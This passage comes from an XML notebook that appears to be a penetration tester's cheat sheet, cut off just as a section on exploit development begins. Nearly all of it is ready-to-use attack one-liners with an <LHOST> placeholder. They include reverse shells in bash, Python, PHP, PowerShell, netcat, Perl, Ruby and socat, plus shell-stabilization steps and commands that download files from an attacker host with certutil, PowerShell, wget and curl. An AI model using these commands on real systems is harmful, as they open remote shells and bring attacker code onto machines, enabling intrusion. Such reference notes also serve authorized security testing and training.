    <node name="09. Shells, File Transfer &amp; Utilities" tags="" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
      <rich_text></rich_text>

      <node name="Reverse Shells" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
        <rich_text>bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/4444 0&gt;&amp;1
# Bash reverse shell
--------------------------------------------------
python3 -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;LHOST&gt;&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;
# Python3 reverse shell
--------------------------------------------------
php -r &apos;$sock=fsockopen(&quot;&lt;LHOST&gt;&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;
# PHP reverse shell
--------------------------------------------------
powershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&apos;&lt;LHOST&gt;&apos;,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &apos;PS &apos; + (pwd).Path + &apos;&gt; &apos;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;
# PowerShell reverse shell
--------------------------------------------------
nc -e /bin/sh &lt;LHOST&gt; 4444
# Netcat reverse shell (traditional)
--------------------------------------------------
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;LHOST&gt; 4444 &gt;/tmp/f
# Netcat FIFO reverse shell (modern Linux)
--------------------------------------------------
perl -e &apos;use Socket;$i=&quot;&lt;LHOST&gt;&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);}&apos;
# Perl reverse shell
--------------------------------------------------
ruby -rsocket -e&apos;f=TCPSocket.open(&quot;&lt;LHOST&gt;&quot;,4444).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;
# Ruby reverse shell
--------------------------------------------------
</rich_text>
      </node>

      <node name="Shell Upgrades &amp; Stabilization" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
        <rich_text>python3 -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;
# Upgrade to interactive PTY shell
--------------------------------------------------
# Press Ctrl+Z to background the shell
stty raw -echo; fg
# Disable local terminal echo and bring shell to foreground
--------------------------------------------------
export TERM=xterm
# Enable clear screen and standard terminal shortcuts
--------------------------------------------------
stty rows 48 columns 190
# Match shell dimensions to local terminal window
--------------------------------------------------
rlwrap nc -lvnp 4444
# Start listener with readline wrapper for arrow-key history support
--------------------------------------------------
socat file:`tty`,raw,echo=0 tcp-listen:4444
# Attacker: Fully stable socat listener
--------------------------------------------------
socat exec:&apos;bash -li&apos;,pty,stderr,setsid,sigint,sane tcp:&lt;LHOST&gt;:4444
# Target: Fully stable socat reverse shell
--------------------------------------------------
</rich_text>
      </node>

      <node name="File Transfer" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
        <rich_text>python3 -m http.server 80
# Linux: Start quick HTTP server for file hosting
--------------------------------------------------
impacket-smbserver share . -smb2support
# Linux: Start SMB server for Windows file transfers
--------------------------------------------------
certutil -urlcache -split -f http://&lt;LHOST&gt;/file.exe C:\Temp\file.exe
# Windows: Download file via certutil
--------------------------------------------------
powershell -c &quot;Invoke-WebRequest http://&lt;LHOST&gt;/file.exe -OutFile C:\Temp\file.exe&quot;
# Windows: Download file via PowerShell
--------------------------------------------------
copy \\&lt;LHOST&gt;\share\file.exe C:\Temp\
# Windows: Copy file from attacker SMB share
--------------------------------------------------
wget http://&lt;LHOST&gt;/file -O /tmp/file
# Linux: Download file via wget
--------------------------------------------------
curl http://&lt;LHOST&gt;/file -o /tmp/file
# Linux: Download file via curl
--------------------------------------------------
scp /tmp/file user@&lt;TARGET_IP&gt;:/tmp/
# Linux: Push file to target via SCP
--------------------------------------------------
</rich_text>
      </node>
    </node>

    <node name="10. Exploit Development &amp; CVEs" tags="" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
